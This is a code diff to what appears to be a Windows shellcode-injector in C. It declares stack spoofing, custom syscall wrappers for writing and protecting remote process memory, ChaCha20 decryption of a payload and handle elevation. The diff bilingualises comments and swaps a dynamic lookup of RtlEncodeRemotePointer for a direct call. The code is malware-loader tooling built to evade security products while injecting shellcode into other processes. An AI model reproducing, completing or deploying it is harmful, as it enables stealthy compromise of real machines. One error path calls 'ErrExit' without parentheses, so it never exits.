@@ -7,7 +7,7 @@
 #include "VEHinj.h"
 #include "shellcode.h"
 
-// GalaxyGate Stack Spoof
+// GalaxyGate 自研栈欺骗方案 Stack Spoof Solution
 LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo);
 NTSTATUS SFNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
 NTSTATUS SFNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
@@ -18,10 +18,10 @@ NTSTATUS SFNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HA
 NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
 NTSTATUS SFNtQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength);
 
-// ChaCha20 Decryption
+// ChaCha20 解密 Decryption
 void chacha20_decrypt(const unsigned char* encrypted, size_t len, const unsigned char* key, const unsigned char* nonce, unsigned char* decrypted);
 
-// Tools
+// 杂项 utils
 DWORD ConvertProcNameToPid(wchar_t* ProcName);
 HANDLE ElevateHandle(IN HANDLE hProcess, IN ACCESS_MASK DesiredAccess, IN DWORD HandleAttributes);
 PVOID GetLocalKernel32EntryPoint();
@@ -33,7 +33,7 @@ void PrintDbgA(char* message);
 void PrintDbgW(wchar_t* message);
 void ErrExit();
 
-// Customized CRT Functions
+// 自定义C运行时函数 Customized CRT Functions
 size_t SFstrlen(const char* s);
 size_t SFwcslen(const wchar_t* s);
 wchar_t* SFwcsstr(const wchar_t* haystack, const wchar_t* needle);
@@ -130,16 +130,7 @@ void InjectorEntry() {
 
 	// 编码Shellcode指针
 	PVOID encodedShellcodePointer = NULL;
-	PVOID ntdllBase = NULL;
-	UNICODE_STRING usNtdll;
-	SFRtlInitUnicodeString(&usNtdll, L"ntdll.dll");
-	status = LdrGetDllHandle(NULL, NULL, &usNtdll, &ntdllBase);
-	ANSI_STRING asFunc;
-	SFRtlInitAnsiString(&asFunc, "RtlEncodeRemotePointer");
-	typedef NTSTATUS(NTAPI* PRtlEncodeRemotePointer)(HANDLE ProcessHandle, PVOID Ptr, PVOID* EncodedPtr);
-	PRtlEncodeRemotePointer pRtlEncodeRemotePointer = NULL;
-	status = LdrGetProcedureAddress(ntdllBase, &asFunc, 0, (PVOID*)&pRtlEncodeRemotePointer);
-	status = pRtlEncodeRemotePointer(hProcess, shellcodeAddress, &encodedShellcodePointer);
+	status = RtlEncodeRemotePointer(hProcess, shellcodeAddress, &encodedShellcodePointer);
 	if (status != 0) { // 即!=NT_SUCCESS
 		PrintDbgW(L"[-] 编码Shellcode指针失败 | Failed to encode shellcode pointer\n");
 		ErrExit;
